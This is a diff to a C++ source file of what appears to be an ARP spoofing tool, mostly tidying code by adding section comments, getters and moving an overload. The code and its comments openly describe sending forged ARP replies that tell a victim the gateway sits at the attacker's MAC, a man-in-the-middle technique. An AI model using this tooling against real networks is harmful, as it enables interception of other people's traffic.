@@ -1,5 +1,6 @@
 #include "Core.hh"
 
+/* CONSTRUCTORS / DESTRUCTORS */
 Core::Core(void)
     : _iface(NetworkInterface::default_interface()), _attacker(_iface.addresses().hw_addr, _iface.addresses().ip_addr), _sender(_iface), _senderRun(true)
 {
@@ -20,12 +21,14 @@ Core::~Core(void)
     _senderRun = false;
 }
 
-// Resolve for me
-const HWAddress<6> Core::arpRequest(const IPv4Address &targetIp)
-{
-    return arpRequest(targetIp, _attacker.ip() , _attacker.mac());
-}
 
+/* GETTERS / SETTERS */
+const HWAddress<6> Core::mac(void) const { return _attacker.mac(); }
+
+const IPv4Address Core::ip(void) const { return _attacker.ip(); }
+
+
+/* PUBLIC MEMBERS */
 const HWAddress<6> Core::arpRequest(const IPv4Address &targetIp, const IPv4Address &senderIp, const HWAddress<6> &senderMac)
 {
     EthernetII      arpReq = ARP::make_arp_request(targetIp, senderIp, senderMac);
@@ -42,6 +45,12 @@ const HWAddress<6> Core::arpRequest(const IPv4Address &targetIp, const IPv4Addre
     return HWAddress<6>("00:00:00:00:00:00");
 }
 
+// Resolve for me
+const HWAddress<6> Core::arpRequest(const IPv4Address &targetIp)
+{
+    return arpRequest(targetIp, _attacker.ip() , _attacker.mac());
+}
+
 /* Tell (targetIp/targetMac) that senderIp is on senderMac
  * Usually senderIp is the gateway, senderMac is the attacker and target is the victim
  */
@@ -51,7 +60,6 @@ void Core::arpReply(const IPv4Address &senderIp, const HWAddress<6> &senderMac, 
 
     send(rep);
 }
-
 
 void Core::send(const EthernetII &pkt)
 {
@@ -64,6 +72,7 @@ void Core::send(const EthernetII &pkt)
         _senderMutex.unlock();
 }
 
+/* PRIVATE MEMBERS */
 void Core::startSender(void)
 {
     while (_senderRun)
